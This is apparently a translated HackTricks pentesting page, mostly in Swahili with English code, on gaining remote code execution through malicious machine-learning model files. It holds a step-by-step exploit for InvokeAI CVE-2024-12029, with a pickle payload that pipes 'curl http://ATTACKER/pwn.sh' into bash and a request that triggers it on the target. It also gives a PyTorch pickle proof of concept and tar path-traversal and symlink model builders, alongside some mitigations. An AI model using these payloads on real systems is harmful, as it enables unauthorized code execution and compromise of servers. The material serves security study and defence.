# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Modeli za Machine Learning kawaida hushirikiwa katika mifumo tofauti, kama ONNX, TensorFlow, PyTorch, n.k. Hizi modeli zinaweza kupakuliwa kwenye mashine za waendelezaji au mifumo ya uzalishaji ili kuzitumia. Kawaida, modeli hazipaswi kuwa na msimbo mbaya, lakini kuna baadhi ya kesi ambapo modeli inaweza kutumika kutekeleza msimbo wa kiholela kwenye mfumo kama kipengele kilichokusudiwa au kwa sababu ya udhaifu katika maktaba ya kupakia modeli.

Wakati wa kuandika, haya ni baadhi ya mifano ya aina hii ya udhaifu:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |

Zaidi ya hayo, kuna baadhi ya modeli za python pickle kama zile zinazotumiwa na [PyTorch](https://github.com/pytorch/pytorch/security) ambazo zinaweza kutumika kutekeleza msimbo wa kiholela kwenye mfumo ikiwa hazijapakiwa na `weights_only=True`. Hivyo, modeli yoyote inayotegemea pickle inaweza kuwa na hatari maalum kwa aina hii ya mashambulizi, hata kama hazijatajwa kwenye jedwali hapo juu.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` ni kiolesura maarufu cha wavuti cha chanzo wazi kwa Stable-Diffusion. Matoleo **5.3.1 – 5.4.2** yanaonyesha mwisho wa REST `/api/v2/models/install` ambao unaruhusu watumiaji kupakua na kupakia modeli kutoka URL za kiholela.

Ndani, mwisho huu hatimaye unaita:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wakati faili iliyotolewa ni **PyTorch checkpoint (`*.ckpt`)**, `torch.load` inafanya **pickle deserialization**. Kwa sababu maudhui yanatoka moja kwa moja kwenye URL inayodhibitiwa na mtumiaji, mshambuliaji anaweza kuingiza kitu kibaya chenye njia ya `__reduce__` iliyobinafsishwa ndani ya checkpoint; njia hiyo inatekelezwa **wakati wa deserialization**, ikisababisha **remote code execution (RCE)** kwenye seva ya InvokeAI.

Uthibitisho wa udhaifu ulipatiwa **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Mwongozo wa unyakuzi

1. Tengeneza checkpoint mbaya:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Kuweka `payload.ckpt` kwenye seva ya HTTP unayodhibiti (mfano `http://ATTACKER/payload.ckpt`).
3. Chochea kiunganishi kilichohatarishwa (hakuna uthibitisho unaohitajika):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wakati InvokeAI inaposhusha faili inaita `torch.load()` → gadget ya `os.system` inakimbia na mshambuliaji anapata utekelezaji wa msimbo katika muktadha wa mchakato wa InvokeAI.

Exploit iliyotengenezwa tayari: **Metasploit** moduli `exploit/linux/http/invokeai_rce_cve_2024_12029` inaweka mchakato mzima kuwa otomatiki.

#### Masharti

•  InvokeAI 5.3.1-5.4.2 (bendera ya skana ya kawaida **false**)
•  `/api/v2/models/install` inapatikana na mshambuliaji
•  Mchakato una ruhusa za kutekeleza amri za shell

#### Mipango ya Kuzuia

* Pandisha hadi **InvokeAI ≥ 5.4.3** – patch inafanya `scan=True` kuwa ya kawaida na inafanya uchunguzi wa malware kabla ya deserialization.
* Wakati wa kupakia checkpoints kwa njia ya programu tumia `torch.load(file, weights_only=True)` au [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) msaidizi mpya.
* Lazimisha orodha za ruhusa / saini za vyanzo vya modeli na endesha huduma hiyo kwa ruhusa ndogo.

> ⚠️ Kumbuka kwamba **aina yoyote** ya muundo wa pickle wa Python (ikiwemo faili nyingi za `.pt`, `.pkl`, `.ckpt`, `.pth`) kwa asili si salama kutekeleza kutoka vyanzo visivyoaminika.

---

Mfano wa mipango ya kuzuia ya ad-hoc ikiwa lazima uendelee kutumia toleo za zamani za InvokeAI nyuma ya proxy ya kurudi:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Mfano – kuunda mfano mbaya wa PyTorch

- Unda mfano:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Pakia mfano:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Models to Path Traversal

Kama ilivyoelezwa katika [**hiki blogu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), muundo wa modeli nyingi zinazotumiwa na mifumo tofauti ya AI unategemea archives, mara nyingi `.zip`. Hivyo, inaweza kuwa inawezekana kutumia muundo huu kufanya mashambulizi ya path traversal, kuruhusu kusoma faili za kawaida kutoka kwa mfumo ambapo modeli imepakuliwa.

Kwa mfano, kwa kutumia msimbo ufuatao unaweza kuunda modeli ambayo itaunda faili katika saraka ya `/tmp` wakati inapo pakuliwa:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Au, kwa kutumia msimbo ufuatao unaweza kuunda mfano ambao utaunda symlink kwa saraka ya `/tmp` wakati inapo load:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## References

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
